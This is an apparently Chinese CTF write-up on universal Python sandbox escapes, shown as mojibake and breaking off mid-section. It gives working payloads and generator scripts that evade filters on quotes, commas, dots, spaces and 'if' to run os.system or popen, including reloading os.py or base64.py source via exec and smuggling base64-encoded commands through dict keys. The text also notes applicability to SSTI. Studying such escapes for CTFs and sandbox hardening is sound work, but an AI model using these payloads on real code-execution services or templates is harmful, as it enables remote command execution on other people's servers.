# Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯

- æ¥æºï¼šhttps://cn-sec.com/archives/1322842.html



## â˜ï¸ è¯´åœ¨å‰é¢

è®©ç”¨æˆ·æäº¤ Python ä»£ç å¹¶åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œæ˜¯ä¸€äº› OJã€é‡åŒ–ç½‘ç«™é‡è¦çš„æœåŠ¡ï¼Œå¾ˆå¤š CTF ä¹Ÿæœ‰ç±»ä¼¼çš„é¢˜ã€‚ä¸ºäº†ä¸è®©æ¶æ„ç”¨æˆ·æ‰§è¡Œä»»æ„çš„ Python ä»£ç ï¼Œå°±éœ€è¦ç¡®ä¿ Python è¿è¡Œåœ¨æ²™ç®±ä¸­ã€‚æ²™ç®±ç»å¸¸ä¼šç¦ç”¨ä¸€äº›æ•æ„Ÿçš„å‡½æ•°ï¼Œä¾‹å¦‚ osã€‚

å…¶æ¬¡ï¼Œåœ¨å¤§å¤šæ•° Python çš„ SSTI ä¸­ï¼Œæ²™ç®±é€ƒé€¸ä¸­å¯ä»¥ä½¿ç”¨çš„æ‰‹æ®µï¼Œé€šå¸¸æ¥è¯´ä¹Ÿå¯ä»¥ç”¨åœ¨ SSTI é‡Œï¼Œè‡³å°‘ä¹Ÿèƒ½èµ·åˆ°ä¸€ä¸ªé‡è¦çš„æŒ‡å¯¼æ„ä¹‰ã€‚

å…¶å®æ²™ç®±é€ƒé€¸å¤§éƒ¨åˆ†çŸ¥è¯†ç‚¹ï¼Œåœ¨ 19 å¹´ 5 æœˆæˆ‘å°±å·²ç»æ•´ç†å®Œå‘å¸ƒå‡ºæ¥äº†ï¼Œåœ¨çœ‹æœ¬ç¯‡ä¹‹å‰ï¼Œå»ºè®®å†çœ‹ä¸‹è¿™ç¯‡å¤ä¹ ä¸€ä¸‹ï¼š

`https://www.tr0y.wang/2019/05/06/Pythonæ²™ç®±é€ƒé€¸ç»éªŒæ€»ç»“/`

é‚£ä¹ˆä¸ºä»€ä¹ˆè¿˜æœ‰è¿™ç¯‡å‘¢ï¼Ÿ

æ­£å¦‚ã€ŠOrangeKiller CTF ç¬¬ 3 æœŸã€‹ä¸­æ‰€è¯´ï¼Œåœ¨åšè¿™æœŸé¢˜ç›®çš„æ—¶å¼•å‡ºäº†æœ¬æ–‡çš„æ¢ç´¢ã€‚åŒæ—¶ï¼Œæœ¬ç¯‡ä¹Ÿä½œä¸º wp å…¬å¸ƒä¸‹ç¬¬ä¸‰æœŸä¸­é¢˜ç›®çš„è§£æ³•ã€‚

## â˜ï¸ é€šè§£æ¢ç´¢

ä¸€åˆ‡è¿˜æ˜¯è¦ä»è¿™é“é¢˜ç›®å¼€å§‹ã€‚

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/8-1664366564.png)



è§£é‡Šä¸€ä¸‹ï¼šæ„é€ å‡ºä¸€ä¸ª CMDï¼Œè¿™ä¸ª CMD ç»è¿‡è¿™ä¸ª `all` çš„è®¡ç®—åç»“æœå¿…é¡»ä¸º `True`ï¼Œä¸” `eval(CMD)` éœ€è¦å¯ä»¥åœ¨ os shell é‡Œæ‰§è¡Œ `id`ï¼ˆå…¶å®å°±æ˜¯å®ç° RCE å•¦ï¼‰ã€‚

### ğŸŒ§ è§£æ³•ä¸€

ä»æ‰§è¡Œä¸Šä¸‹æ–‡çœ‹ï¼Œæˆ‘ä»¬è¦æ„é€ å‡ºçš„ `CMD` æ˜¾ç„¶æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå› ä¸ºä¸‹é¢ä¼šè¿›è¡Œ `eval`ã€‚é‚£ä¹ˆè¿™é‡Œå°±æœ‰ç¬¬ä¸€ä¸ªé—®é¢˜ï¼šå¦‚ä½•æ„é€ å‡ºä»»æ„å­—ç¬¦ä¸²ï¼Ÿ

å› ä¸ºä¸Šé¢çš„é™åˆ¶æ¡ä»¶æŠŠ `"`ã€`'` éƒ½å¹²æ‰äº†ï¼Œæ‰€ä»¥ç›´è§‰ä¸Šæˆ‘ä»¬ä¼šé€‰æ‹©ç”¨ `chr` + `+` æ¥æ‹¼æ¥å‡ºå­—ç¬¦ä¸²ï¼Œä½†æ˜¯ `+` ä¹Ÿè¢«å¹²æ‰äº†ã€‚![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/1-1664366565.png)

è€Œç”±äº `,` ä¹Ÿè¢«å¹²æ‰äº†ï¼Œæ‰€ä»¥è™½ç„¶èƒ½è°ƒç”¨å‡½æ•°ï¼Œä½†æ˜¯ä¹Ÿåªèƒ½ä¼ ä¸€ä¸ªå‚æ•°ã€‚å¹¶ä¸” `.` ä¹Ÿè¢«é™åˆ¶æ‰äº†ï¼Œæ‰€ä»¥å°±ç®—å¯ä»¥ `__import__` ä¹Ÿæ²¡æ³•è°ƒç”¨æ–¹æ³•ã€‚

å¯¹ Python CTF é¢˜æ¯”è¾ƒç†Ÿæ‚‰çš„æ©˜å‹ï¼Œç¬¬ä¸€ååº”å¯èƒ½æ˜¯ç”¨ `list`+`dict`ï¼š`list(dict(whoami=1))[0]`ã€‚è¿™ä¸ª payload è¿˜æ˜¯æ¯”è¾ƒå¥½ç”¨çš„ï¼Œä½†é—®é¢˜æ˜¯ï¼Œç”±äº `whoami` ä½œä¸ºå‚æ•°åï¼Œæ— æ³•æºå¸¦ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦ï¼Œä¾‹å¦‚ç©ºæ ¼ã€å¼•å·ã€æ‹¬å· ç­‰ç­‰ï¼Œæ‰€ä»¥ä»…å‡­è¿™ä¸ªæ‰‹æ³•å»æ„é€ çš„ expï¼Œåœ¨å®é™…çš„åˆ©ç”¨è¿‡ç¨‹ä¸­ä¸æ˜¯éå¸¸å®ç”¨ã€‚

![image-20230505210132915](picture/image-20230505210132915.png)

æ‰€ä»¥éœ€è¦å¯»æ‰¾å…¶ä»–åŠæ³•ã€‚ç»è¿‡ä¸€ç•ªå¯»æ‰¾ï¼Œæˆ‘åœ¨å†…ç½®çš„å‡½æ•°ä¸­å‘ç°äº† `bytes()`ï¼š

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/4-1664366567.png)

ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥æ¥æ”¶ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼Œé‡Œé¢æ˜¯ 0-256 çš„æ•´æ•°ï¼Œç„¶åå°±ä¼šè¿”å›ä¸€ä¸ª bytesï¼š

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/7-1664366568.png)

ç”±äº `range()` æ˜¯å›ºå®šé¡ºåºçš„ï¼Œæ— æ³•å¾—åˆ°æˆ‘ä»¬è¦çš„ä»»æ„å­—ç¬¦ä¸²ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥é—®é¢˜å°±å˜æˆäº†ï¼š

- **å¦‚ä½•æ„é€ åŒ…å«ä»»æ„åºåˆ—çš„æ•´æ•°çš„å¯è¿­ä»£å¯¹è±¡ï¼Ÿ**

å¦‚æœèƒ½æ„é€ å‡º `[119, 104, 111, 97, 109, 105]` è¿™æ ·çš„åºåˆ—ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡ `bytes()` å¾—åˆ° `whoami`ã€‚ç”±äºä¸èƒ½ä½¿ç”¨ `,`ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥å†™ä¸€ä¸ªåˆ—è¡¨æˆ–è€…é›†åˆä¹‹ç±»çš„å‡ºæ¥ã€‚

æœ€å…ˆæ˜ å…¥æˆ‘è„‘æµ·ä¸­çš„æ˜¯**åˆ—è¡¨æ¨å¯¼å¼**ï¼Œå› ä¸ºå¯ä»¥é€šè¿‡ `if` æ¥ä»åˆ—è¡¨ä¸­æéœ€è¦çš„æ•°æ®ã€‚é‚£ä¹ˆé—®é¢˜æ˜¯è¿™ä¸ªå¸ƒå°”è¡¨è¾¾å¼è¦æ€ä¹ˆå†™å‘¢ï¼Ÿå…ˆæ€è€ƒä¸€ä¸‹ï¼š

å¯¹äºä¸€ä¸ªæœ‰åºçš„åˆ—è¡¨ï¼Œè‹¥æƒ³æå‡ºä»»æ„æ’åºçš„å­—ç¬¦ä¸²ï¼Œä¸ä½†éœ€è¦å›ºå®šä¸‹æ¥æ¯ä¸ªå­—ç¬¦çš„ä½ç½®ï¼Œè¿˜éœ€è¦ä¿è¯å›ºå®šä½ç½®æ˜¯ç‰¹å®šçš„å­—ç¬¦ï¼Œæ‰€ä»¥è‚¯å®šéœ€è¦ä¸¤ä¸ªæ¡ä»¶ç»„åˆï¼Œé‚£ä¹ˆ payload å°±å‘¼ä¹‹æ¬²å‡ºäº†ï¼š

```python
In [1]: bytes([
    ...:     j for i in range(256) for j in range(256)
    ...:     if i==0 and j == 119 or i == 1 and j == 104 or i == 2 and j == 111
    ...:     or i == 3 and j == 97 or i == 4 and j == 109 or i == 5 and j == 105
    ...: ])
Out[1]: b'whoami'

[j for i in range(256) for j in range(256)] ç›¸å½“äºä»¥ä¸‹ä»£ç 

a = []
for i in range(256):
    for j in range(256):
        a.append(j)  
payload ä»£ç å…­ä¸ª i æ‹¿å‡º 6ä¸ªå­—ç¬¦ï¼Œj çš„å€¼å†³å®šäº†æ‹¿åˆ°çš„å­—ç¬¦çš„å€¼æ˜¯ä»€ä¹ˆã€‚        
        
```



å¯¹åº”çš„æ„é€ è„šæœ¬ï¼š

```python
exp = '__import__("os").system("id")'

print(f"eval(bytes([j for i in range({len(exp)}) for j in range(256) if "+" or ".join([f"i=={i} and j=={ord(j)}" for i, j in enumerate(exp)]) + "]))")
```

å¯ä»¥æŠŠä»¥ä¸Šè„šæœ¬æ‹‰å…¥ pycharm ç»†ç»†åˆ†æï¼Œä»£ç è¿‡é•¿å¯ä»¥å‚çœ‹[æ­¤å¤„](https://blog.csdn.net/weixin_36338224/article/details/114693282)è®¾ç½®ä¸€ä¸‹è‡ªåŠ¨æ¢è¡Œã€‚

![image-20230505212731309](picture/image-20230505212731309.png)



è¿˜æœ‰ä¸€ä¸ª**ç©ºæ ¼**çš„é™åˆ¶ï¼Œè¿™ä¸ªå§¿åŠ¿åœ¨ OrangeKiller CTF çš„ç¬¬äºŒæœŸå·²ç»è¯´è¿‡äº†ï¼Œç”¨ `[]` æ¥æ›¿ä»£ã€‚æ„é€ è„šæœ¬ï¼š

```python
exp = '__import__("os").system("id")'

print(f"eval(bytes([[j][0]for(i)in[range({len(exp)})][0]for(j)in[range(256)][0]if["+"]or[".join([f"i]==[{i}]and[j]==[{ord(j)}" for i, j in enumerate(exp)]) + "]]))")
```

![image-20230505213223915](picture/image-20230505213223915.png)

è¿™ä¸ª payload å¯è¯»æ€§å·²ç»ç‰¹åˆ«å·®äº†ã€‚ã€‚ã€‚

- ç›®å‰å¯¹äºç”¨ä¸­æ‹¬å·æ›¿ä»£ç©ºæ ¼ä¸æ˜¯å®Œå…¨ç†è§£ã€‚

å¦‚æœé¢å¤–é™åˆ¶äº† `==`ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥ç”¨ `in` æ¥ä»£æ›¿ï¼š

```python
exp = '__import__("os").system("id")'

print(f"eval(bytes([[j][0]for(i)in[range({len(exp)})][0]for(j)in[range(256)][0]if["+"]]or[".join([f"i]in[[{i}]]and[j]in[[{ord(j)}" for i, j in enumerate(exp)]) + "]]]))")
```

æœ€åè¿™ä¸ª exp é•¿è¿™æ ·ï¼š

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/9-1664366570.png)

å¦‚æœ `bytes` ä¹‹ç±»çš„å†…ç½®å‡½æ•°è¢«ç¦ç”¨äº†ï¼Œå¯ä»¥é€šè¿‡ Unicode æ¥ç»•è¿‡ï¼Œè¿™ä¸ªæŠ€å·§æˆ‘ä»¬å·²ç»è§å¾—å¤šäº†ï¼Œå°±ä¸å¤šè¯´äº†ã€‚

æ‰€ä»¥ï¼Œè¿™ä¸ª payload åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹å·²ç»å¯ä»¥é€šç”¨äº†ã€‚

- è¿™ä¸ª payload ä»…åŒ…å« å­—æ¯ã€å·¦å³å°/ä¸­æ‹¬å·ã€æ•°å­—ã€‚

### ğŸŒ§ è§£æ³•äºŒ

è§£æ³•ä¸€æœ‰ä¸€ä¸ªæ¯”è¾ƒå¤§çš„é—®é¢˜æ˜¯ï¼Œ`if` æ˜¯æ²¡åŠæ³•ç”¨ Unicode ç»•è¿‡çš„ã€‚å‡å¦‚è¢«ç¦äº†é‚£ä¹ˆå°± GG äº†ã€‚æ‰€ä»¥ï¼Œåœ¨ä¸Šé¢æ¡ä»¶é™åˆ¶çš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬æŠŠ if å¹²æ‰ï¼Œçœ‹çœ‹èƒ½å¦æ‰¾åˆ°è§£å†³åŠæ³•ã€‚![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/2-1664366573.png)

ç»è¿‡ä¸€ç•ªæ€ç´¢ï¼Œæˆ‘ç»™å‡ºçš„ç¬¬äºŒä¸ªç­”æ¡ˆæ˜¯ï¼šæ¨¡æ‹Ÿ importã€‚

æˆ‘ä»¬çŸ¥é“ï¼Œimport å¯ä»¥è®¤ä¸ºæ˜¯æ‰“å¼€æºç ä¹‹åæ‰§è¡Œä»£ç ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æ¨¡æ‹Ÿè¿™ä¸ªè¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯ `exec(open(...).read())`ï¼Œä»è€Œå¼•å…¥æ‰€éœ€çš„å‡½æ•°ã€‚

é¦–å…ˆé¢ä¸´çš„é—®é¢˜æ˜¯ï¼šå¦‚ä½•çŸ¥é“åº“çš„ç»å¯¹è·¯å¾„å‘¢ï¼Ÿå¯¹äºéƒ¨åˆ†é¢˜ç›®æ¥è¯´ï¼Œå¯èƒ½å­˜åœ¨ç»å¯¹è·¯å¾„æ³„éœ²ï¼Œä½†æ˜¯è¿™ä¸ªå¹¶ä¸é€šç”¨ï¼Œæˆ‘ä¸å–œæ¬¢ã€‚å…¶å® `__import__` ä¹‹åï¼Œè¿”å›çš„ module ç»è¿‡ str å°±ä¼šæœ‰ç»å¯¹è·¯å¾„ï¼š

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/2-1664366574.png)

æ‰€ä»¥å°±å¯ä»¥è¿™æ ·ï¼š`open(str(__import__("os"))[19:-2])`ã€‚

é—®é¢˜åˆæ¥äº†ï¼Œè¦æƒ³è¯»å‡ºæ–‡ä»¶å†…å®¹ï¼Œé€šå¸¸æˆ‘ä»¬ä¼šç”¨ `.read()`ï¼Œä½†æ˜¯ `.` å·²ç»è¢«å¹²æ‰äº†ã€‚å¥½åœ¨ï¼Œ`open` çš„è¿”å›å€¼æ˜¯ `_io.TextIOWrapper`ï¼Œç”±äºå­˜åœ¨ `__iter__` æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠå®ƒå½“åšæ˜¯ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡æ¥è¿­ä»£ã€‚ä¹Ÿå°±æ˜¯å¯ä»¥é€šè¿‡ `list(open(str(__import__("os"))[19:-2]))` å–å‡ºæ–‡ä»¶å†…å®¹ï¼Œè¿™ä¸ªæ•ˆæœç­‰ä»·ä¸ `open(...).readlines()`ï¼š

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/10-1664366576.png)

```python
list(open(str(__import__("os"))[19:-2])) == open(str(__import__("os"))[19:-2]).readlines()
# åœ¨ python shell é‡Œæ‰§è¡Œä¸€æ¬¡ä»¥ä¸Šå‘½ä»¤åå†æ¬¡æ‰§è¡Œç›¸åŒå‘½ä»¤ä¼šæŠ¥é”™ï¼Ÿä¸ç”šç†è§£ã€‚
```

é‚£ä¹ˆé—®é¢˜åˆæ¥äº†ï¼Œè¿™ç§å½¢å¼çš„æºç ï¼Œ`exec` æ˜¯æ²¡æ³•æ‰§è¡Œçš„ã€‚ç”±äºå­˜åœ¨å„ç§é™åˆ¶ï¼Œ`join` è¿™ç§éƒ½ä¸ç”¨æƒ³äº†ã€‚ç»è¿‡ä¸€ç•ªæ€ç´¢ï¼Œæˆ‘æ„Ÿè§‰è¿˜æ˜¯å¾—ç”¨åˆ°åˆ—è¡¨æ¨å¯¼ã€‚æ€è·¯æ˜¯ç”¨ä¸€ä¸ªäºŒå±‚å¾ªç¯ï¼Œä¸€å±‚å°†åˆ—è¡¨é‡Œçš„å­—ç¬¦ä¸²æ‹†è§£å‡ºæ¥ï¼Œä¾‹å¦‚ `["ab", "cd"]` è½¬ä¸º `["a", "b", "c", "d"]`ï¼›ç¬¬äºŒå±‚å°†åˆ—è¡¨é‡Œçš„å­—ç¬¦ï¼Œè½¬ä¸º ASCII ç ï¼Œç„¶åå†ç”¨ `bytes` è½¬ä¸ºå®Œæ•´çš„å­—ç¬¦ä¸²ã€‚

payload å¦‚ä¸‹ï¼ˆè¿™é‡Œçš„ç¼©è¿›åªæ˜¯ä¸ºäº†æ›´å¥½åœ°ç†è§£ï¼Œå®é™…ä¸Šæ˜¯ä¸éœ€è¦çš„ï¼‰ï¼š

```python
exec(
    bytes([
        ord(j)
        for(i)in(
            list(
                open(
                    str(
                        __import__(
                            list(dict(os=1))[0]
                        )
                    )[19:-2]
                )
            )
        )
        for(j)in(i)
    ])
)
```

è‡³æ­¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œ `os.py` é‡Œçš„æ‰€æœ‰å‡½æ•°äº† ![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/3-1664366577.png)ï¼š

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/0-1664366579.png)

ç”±äºä¸Šè¿°è½½å…¥å‡½æ•°å’Œæ‰§è¡Œå‡½æ•°æ˜¯åˆ†å¼€æ‰§è¡Œçš„ï¼Œä¸æ˜¯å¾ˆä¼˜é›…ï¼Œæœ‰åŠæ³•åˆå¹¶æˆä¸€å¥æ‰§è¡Œä¹ˆï¼Ÿ

é¦–å…ˆåˆ†æä¸€ä¸‹ï¼Œpayload å¿…é¡»åœ¨æ‰§è¡Œå‡½æ•°ä¹‹å‰è¿è¡Œï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ `[exec(...)][0][system("whoami")]` æ¥å®ç°ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ`system` åœ¨è¿è¡ŒæˆåŠŸçš„æ—¶å€™æ‰ä¼šè¿”å› `0`ï¼Œä¸€æ—¦å¤±è´¥ï¼Œè¿”å›çš„æ•°å­—æ¯”è¾ƒå¤§ï¼Œå‘½ä»¤è™½ç„¶å·²æ‰§è¡ŒæˆåŠŸï¼Œä½†æ˜¯æ•´ä¸ª payload çš„æ‰§è¡Œæ˜¯ä¼šå¤±è´¥çš„ï¼Œå¯èƒ½ä¼šé‡åˆ°ä¸å¿…è¦çš„éº»çƒ¦ã€‚å¹¶ä¸”ï¼Œå½¢å¦‚ `popen` è¿™ç§è¿”å›å­—ç¬¦ä¸²çš„ï¼Œä¹Ÿä¸å®œè¿™æ ·åˆ©ç”¨ã€‚

æ›´å¥½çš„æ–¹å¼æ˜¯ç”¨ `[str][bool(exec...)](list(popen("whoami")))`

æ‰€ä»¥è§£æ³•äºŒçš„ payload å¦‚ä¸‹ï¼š

```python
[str][bool(exec(
    bytes([
        ord(j)
        for(i)in(
            list(
                open(
                    str(
                        __import__(
                            list(dict(os=1))[0]
                        )
                    )[19:-2]
                )
            )
        )
        for(j)in(i)
    ])
))](list(popen(list(dict(whoami=1))[0]))[0])
```

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/1-1664366580.png)

å½“ç„¶ï¼Œä¸Šé¢è¿™ä¸ª payloadï¼ŒåŒæ ·å­˜åœ¨ç‰¹æ®Šå­—ç¬¦æ— æ³•æ„é€ çš„é—®é¢˜ï¼Œæ‰§è¡Œ `whoami` è¿™ç§å•ä¸€çš„å‘½ä»¤æ˜¯ ok çš„ï¼Œå¦‚æœæƒ³è¦åå¼¹ä¸ª shell å°±æ²¡æ³•æäº† ![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/3-1664366582.png)

å¥½åœ¨æ€è·¯æœ‰äº†ï¼Œåªéœ€è¦æ¢ä¸€ä¸‹åº“å°±è¡Œã€‚`dict` å‚æ•°è¦æ±‚æ˜¯åˆæ³•çš„å˜é‡åï¼Œé‚£ä¹ˆæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ° base64 é‡Œçš„å­—ç¬¦å¤§éƒ¨åˆ†éƒ½æ˜¯ `0-9a-zA-Z` æ„æˆï¼Œè¿˜æœ‰ç‰¹æ®Šçš„å­—ç¬¦ `=`ã€`/`ã€`+`ã€‚åé¢æˆ‘ä»¬ä¼šæŒ¨ä¸ªè§£å†³è¿™ä¸‰ä¸ªå­—ç¬¦çš„é—®é¢˜ï¼Œå…ˆå±•ç¤ºä¸‹ payloadï¼š

```
[eval][
    bool(
        exec(
            bytes([
                ord(j)
                for(i)in(
                    list(
                        open(
                            str(__import__(list(dict(base64=1))[0]))[23:-2]
                        )
                    )
                )[:-5]
                for(j)in(i)
            ])
        )
    )
](
    b64decode(
        list(
            dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignaWQnKS5yZWFkKCkg=1)
        )[0]
    )
)
```

åŒ…å«çš„å‘½ä»¤ä¸ºï¼š

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/9-1664366583.png)

æ›´è¿›ä¸€æ­¥ï¼Œè¿™ä¸ª payload é‡Œé™¤äº† `eval`ã€`list`ã€`dict`ã€`for`ã€`in`ã€`æ•°å­—` ä¹‹å¤–å…¶ä»–å¸¸é‡/å‡½æ•°/å…³é”®å­—éƒ½ä¸æ˜¯å¿…è¦çš„ã€‚éƒ½å¯ä»¥ç”¨ `eval` + `list` + `dict` æ„é€ ã€‚æ‰€ä»¥è¿™ä¸ª payload å¯ä»¥å˜æˆè¿™æ ·ï¼š

```
CMD = [eval][eval(list(dict(b_o_o_l=1))[0][::2])(eval(list(dict(e_x_e_c=1))[0][::2])(eval(list(dict(b_y_t_e_s=1))[0][::2])([eval(list(dict(o_r_d=1))[0][::2])(j)for(i)in(list(eval(list(dict(o_p_e_n=1))[0][::2])(eval(list(dict(s_t_r=1))[0][::2])(eval(list(dict(_1_1i1m1p1o1r1t1_1_=1))[0][::2])(list(dict(b_a_s_e_6_4=1))[0][::2]))[23:-2])))[:-5]for(j)in(i)])))](eval(list(dict(b_6_4_d_e_c_o_d_e=1))[0][::2])(list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=1))[0]))
```

è‡³æ­¤ï¼Œè¿˜æœ‰ä¸‰ä¸ªç‰¹æ®Šå­—ç¬¦éœ€è¦è§£å†³ï¼š`=`ã€`/`ã€`+`ã€‚ä¸€æ—¦ payload ç»è¿‡ base64 ç¼–ç ä¹‹åå‡ºç°è¿™ä¸‰ä¸ªå­—ç¬¦å°±æ²¡æ³•å½“åš `dict` çš„å‚æ•°äº†ã€‚

ä»”ç»†å›æƒ³ä¸€ä¸‹å°å­¦ 2 å¹´çº§å°±å­¦è¿‡çš„ base64 ç¼–ç  ![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/7-1664366584.png)ï¼š

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/1-1664366586.png)

å½“çº¢æ¡†é‡Œçš„äºŒè¿›åˆ¶å˜æˆ `111111` çš„æ—¶å€™ï¼Œæ ¹æ® base64 è§„èŒƒï¼Œæ­¤æ—¶åº”è¯¥ç¼–ç ä¸º `/`ã€‚è¿™å°±è¦æ±‚åŸæœ¬çš„å­—ç¬¦ä»¥ 6 ä¸ª `1` ç»“å°¾ï¼Œç¬¦åˆè¿™ç§æ¡ä»¶çš„ ascii å­—ç¬¦ï¼Œåªæœ‰ä¸€ä¸ªï¼š`?`ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦ä½ç½®ä¸º 3 çš„å€æ•°ä¸Šçš„å­—ç¬¦æ˜¯ `?`ï¼Œé‚£ä¹ˆç¼–ç åå°±ä¼šå‡ºç° `/`ï¼š

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/3-1664366587.png)

çŸ¥é“åŸå› ä¹‹åï¼Œè§£å†³æ–¹å¼å°±å¾ˆç®€å•äº†ï¼šæ’å…¥æ— å…³ç´§è¦çš„å­—ç¬¦ï¼ŒæŒ¤èµ°åŸæœ¬ä½äº 3 å€æ•°ä½ç½®çš„ `?`ã€‚

åŒç†ï¼Œç¼–ç åå‡ºç° `+` å¯èƒ½çš„å­—ç¬¦æœ‰ `>`ã€`~`ï¼›ç¼–ç åå‡ºç° `=` çš„åŸå› æ˜¯æºå­—ç¬¦ä¸²é•¿åº¦ä¸ä¸º `=` çš„å€æ•°ã€‚è¿™äº›éƒ½å¯ä»¥é€šè¿‡åŠ æ— å…³ç´§è¦çš„å­—ç¬¦æ¥è§£å†³ ![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/10-1664366589.png)ï¼š

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/1-1664366591.png)

### ğŸŒ§ é€šè§£ä¸‰

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/7-1664366592.png)æ¯”è¾ƒé—æ†¾çš„æ˜¯ï¼Œä¸Šé¢è¿™ä¸ª payload å½“åˆ©ç”¨ç‚¹å¤„äºå‡½æ•°å†…éƒ¨çš„æ—¶å€™ï¼Œç”±äº `exec` ç”Ÿæˆçš„å˜é‡æ— æ³•åœ¨å‡½æ•°ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨ï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œæ¨¡å—æºç çš„æ—¶å€™é€šå¸¸ä¼šæŠ¥é”™ã€‚ä¾‹å¦‚ä¸Šé¢è¿™ä¸ªå°±ä¼šæŠ¥ `'_bytes_from_decode_data' is not defined`ï¼š

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/7-1664366594.png)

ä¸€å¼€å§‹æˆ‘çš„æ€è·¯æ˜¯ï¼šèƒ½å¦å¯»æ‰¾åˆ°ä¸€ä¸ªåº“çš„æºç ï¼Œå…¶ä¸­æœ‰ä¸€è¡Œ `__import__("binascii").a2b_base64`ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œæˆ‘å°±å¯ä»¥é€šè¿‡åˆ‡ç‰‡åˆ‡å‡ºæ¥è¿™ä¸€å¥è¯ï¼Œç„¶åç”¨ `eval` æ‰§è¡Œï¼Œå‚æ•°å¯ä»¥é€šè¿‡ for å¾ªç¯æå®šï¼š

![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/4-1664366595.png)

ä½†é—æ†¾çš„æ˜¯ï¼Œç»è¿‡ä¸€ç•ªæœç´¢ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„æ ‡å‡†åº“çš„æºç å¯ä»¥ç”¨æ¥æ‰§è¡Œå¯¼å…¥è§£ç æ¨¡å—çš„è¯­å¥ï¼Œè¦ä¹ˆå°±æ˜¯å­˜åœ¨å¤šçº§ç›®å½•ï¼Œåœ¨æ— æ³•åˆ¤æ–­ python ç»å¯¹è·¯å¾„çš„æƒ…å†µä¸‹ï¼Œä¸å®ç”¨ã€‚å› æ­¤éœ€è¦å¦å¯»å®ƒæ³• ![Python æ²™ç®±é€ƒé€¸çš„é€šè§£æ¢ç´¢ä¹‹è·¯](picture/6-1664366596.png)

å†ç»è¿‡ä¸€ç•ªæ¢ç´¢ï¼Œæˆ‘å‘ç° `vars()` çœŸæ˜¯å®Œç¾ã€‚å®ƒæœ‰ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œå½“æ²¡æŒ‡å®šå‚æ•°çš„æ—¶å€™ï¼Œä¸ `locals()` ç»“æœä¸€è‡´ã€‚å½“æŒ‡å®šå‚æ•°çš„æ—¶å€™ï¼Œä¼šè·å–å‚æ•°æ‰€åœ¨å‘½åç©ºé—´çš„ `locals()`ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆ `import binascii` ï¼Œåœ¨åˆ©ç”¨ `vars(binascii)` å–å‡ºé‡Œé¢çš„ `a2b_base64` ä»è€Œè¿›è¡Œ base64 è§£ç ï¼š

```
